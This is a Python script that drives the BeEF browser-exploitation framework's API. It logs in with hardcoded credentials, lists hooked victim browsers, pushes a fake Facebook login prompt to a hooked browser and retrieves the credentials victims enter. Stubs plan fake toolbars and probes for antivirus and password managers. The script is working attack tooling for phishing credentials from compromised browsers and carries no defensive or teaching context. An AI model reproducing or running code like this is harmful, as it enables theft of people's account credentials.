import sys, os, time, requests, signal, json, pprint
from collections import MutableMapping
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class Browser_Parser:


	def __init__(self):
		self.uname = "beef"
		self.pword = "eaterGin308"
		self.cert_key = "/opt/beef/beef_key.pem"
		self.cert_cert = "/opt/beef/beef_cert.pem"
		self.browser_id = None
		self.cert = (self.cert_cert, self.cert_key)
		self.api_key = self.get_api_key()
		self.facebook_prompt_id = None

	def get_api_key(self):
		hed = "Content-Type: application/json"
		to_beef_serv = {'username' : self.uname, 'password' : self.pword}
		k_une = requests.post(url="https://192.168.3.1:3000/api/admin/login", cert=self.cert, verify=False, json=to_beef_serv)
		k_dict = json.loads(k_une.text)
		return k_dict['token']

	def prompt_facebook_login(self):
		#if self.facebook_prompt_id is None:
		hed = "Content-Type: application/json; charset=UTF-8"
		to_beef_serv = {'choice':'Facebook'}
		k_une = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/242?token=" + str(self.api_key), cert=self.cert, verify=False, json=to_beef_serv)
		k_dict = json.loads(k_une.text)
		if k_dict['success'] == "true":
			print "successfully sent prompt..."
			print "command id:" + str(k_dict['command_id'])
			self.facebook_prompt_id = k_dict['command_id']
		else:
			print "prompt request unsucessful"
			return None

	def get_prompt_credentials(self, idee):
		dets = requests.get(url="https://192.168.3.1:3000/api/modules/" 
			+ str(self.browser_id) 
			+ "/242/" + str(idee) 
			+ "?token=" 
			+ str(self.api_key), cert = self.cert, verify=False)
		pprint.pprint(json.loads(dets.text))

		
	def get_module_deets(self):
		#debug: helper to get details on modules, delete after use
		det = requests.get(url="https://192.168.3.1:3000/api/modules/242?token=" + str(self.api_key), cert=self.cert, verify=False)
		pprint.pprint(json.loads(det.text))


	def check_toolbars(self):
		pass

	def check_lastpass(self):
		pass

	def check_popup_blocker(self):
		pass

	def check_adblock(self):
		pass

	def check_antivirus(self):
		pass

	def do_fake_toolbar(self):
		#based on browser type (chrome, firefox, IE, , launch fake toolbar. record if users click on toolbar
		pass

	def get_hooked_browsers(self):
		to_browser_table = {}
		urll = 'https://192.168.3.1:3000/api/hooks?token=' + str(self.api_key)
		k_une = requests.get(url=urll,  cert = self.cert, verify=False)
		k_dict = json.loads(k_une.text)
		if k_dict['hooked-browsers']['online']:
			print "found currently-hooked browser:"
			for key in k_dict['hooked-browsers']['online']['0']:
				if key == 'session':
					self.browser_id = k_dict['hooked-browsers']['online']['0']['session']
				else:
					to_browser_table[str(key)] = str(k_dict['hooked-browsers']['online']['0'][key])
			print to_browser_table
			print "browser session id: " + str(self.browser_id)
			return to_browser_table
		else:
			print "no hooked browser found"


	def get_browser_deets(self, browser_metadata):
		urll = 'https://192.168.3.1:3000/api/hooks/' + str(self.browser_id) + "?token=" + str(self.api_key)
		k_une = requests.get(url=urll, cert=self.cert, verify=False)
		k_dict = json.loads(k_une.text)
		print k_dict
		#send to database


if __name__ == "__main__":
	bp = Browser_Parser()
	bp.get_api_key()
	md = bp.get_hooked_browsers()
	bp.get_prompt_credentials(63)

